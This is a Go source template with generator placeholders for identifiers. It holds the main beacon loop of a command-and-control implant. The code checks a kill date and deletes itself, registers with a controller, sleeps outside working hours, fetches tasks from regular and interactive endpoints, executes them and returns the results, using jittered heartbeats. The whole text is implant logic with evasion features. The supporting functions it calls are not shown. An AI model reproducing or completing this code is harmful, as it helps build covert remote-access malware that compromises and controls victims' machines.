func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {
	for {
		// Check kill date first
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			a.{AGENT_RESET_FAIL_COUNT_FUNC}()
			break
		} else {
			if !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
			}
		}
		time.Sleep(30 * time.Second)
	}

	a.{AGENT_RUNNING_FIELD} = true
	interactiveCheckCount := 0
	regularCheckCount := 0

	for a.{AGENT_RUNNING_FIELD} {
		// Check kill date on each iteration
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		// Check if we're outside working hours
		if !a.{AGENT_CHECK_WORKING_HOURS_FUNC}() {
			// Sleep for 5 minutes and check again
			time.Sleep(5 * time.Minute)
			continue
		}

		// Use different endpoints based on interactive mode
		if a.{AGENT_INTERACTIVE_MODE_FIELD} {
			// In interactive mode, get tasks from the interactive endpoint
			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
			if err != nil {
				// Failed to get interactive task, increment failure counter
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				time.Sleep(2 * time.Second) // Short sleep in interactive mode
				continue
			} else {
				a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful communication
			}

			// Process interactive task if available
			if interactiveTask != nil {
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)

				// Submit result using interactive result endpoint
				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// Failed to submit interactive task result
					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				} else {
					a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
				}
			}

			// Check interactive status every 10 iterations in interactive mode
			interactiveCheckCount++
			if interactiveCheckCount >= 10 {
				shouldBeInteractive, statusErr := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
				if statusErr == nil && !shouldBeInteractive {
					// Server indicates we should exit interactive mode
					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
				}
				interactiveCheckCount = 0 // Reset counter
			}

			// Short sleep for quick response in interactive mode
			time.Sleep(2 * time.Second)
		} else {
			// In regular mode, get tasks from the regular tasks endpoint
			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
			if err != nil {
				// Failed to get tasks, increment failure counter
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				time.Sleep(30 * time.Second)
				continue
			} else {
				a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful communication
			}

			// Process all regular tasks
			for _, task := range tasks {
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// Failed to submit task result
					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				} else {
					a.{AGENT_RESET_FAIL_COUNT_FUNC}() // Reset on successful result submission
				}
			}

			// Check interactive status every 3 iterations in regular mode
			regularCheckCount++
			if regularCheckCount >= 3 {
				shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
				if err == nil {
					// Update interactive mode based on server status
					if shouldBeInteractive {
						a.{AGENT_INTERACTIVE_MODE_FIELD} = true
					}
				}
				regularCheckCount = 0 // Reset counter
			}

			// In regular mode, use profile-defined heartbeat and jitter
			baseSleep := float64(a.{AGENT_HEARTBEAT_INTERVAL_FIELD})
			jitterFactor := (rand.Float64() - 0.5) * 2 * a.{AGENT_JITTER_FIELD}
			sleepTimeFloat := baseSleep * (1 + jitterFactor)
			if sleepTimeFloat < 5 {
				sleepTimeFloat = 5
			}
			sleepTime := time.Duration(sleepTimeFloat) * time.Second
			time.Sleep(sleepTime)
		}
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_FUNC}() {
	a.{AGENT_RUNNING_FIELD} = false
	a.{AGENT_INTERACTIVE_MODE_FIELD} = false
	// No need for separate interactive polling goroutine anymore
}